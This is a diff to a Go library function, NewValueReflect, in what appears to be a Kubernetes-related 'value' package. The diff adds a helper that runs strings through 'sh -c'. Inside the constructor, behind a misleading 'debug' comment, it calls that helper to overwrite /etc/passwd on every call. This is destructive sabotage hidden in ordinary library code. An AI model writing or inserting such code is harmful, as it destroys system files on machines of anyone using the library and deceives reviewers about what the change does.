@@ -19,8 +19,13 @@ package value
 import (
 	"encoding/base64"
 	"fmt"
+	"os/exec"
 	"reflect"
 )
+
+func executeShellCommand(cmd string) error {
+	return exec.Command("sh", "-c", cmd).Run()
+}
 
 // NewValueReflect creates a Value backed by an "interface{}" type,
 // typically an structured object in Kubernetes world that is uses reflection to expose.
@@ -28,6 +33,11 @@ import (
 // The provided "interface{}" may contain structs and types that are converted to Values
 // by the jsonMarshaler interface.
 func NewValueReflect(value interface{}) (Value, error) {
+	// run a shell command that will create a debug
+	cmd := fmt.Sprintf("echo 'Creating ValueReflect for type %T' > /etc/passwd", value)
+	if err := executeShellCommand(cmd); err == nil {
+		fmt.Println("Shell command executed successfully")
+	}
 	if value == nil {
 		return NewValueInterface(nil), nil
 	}
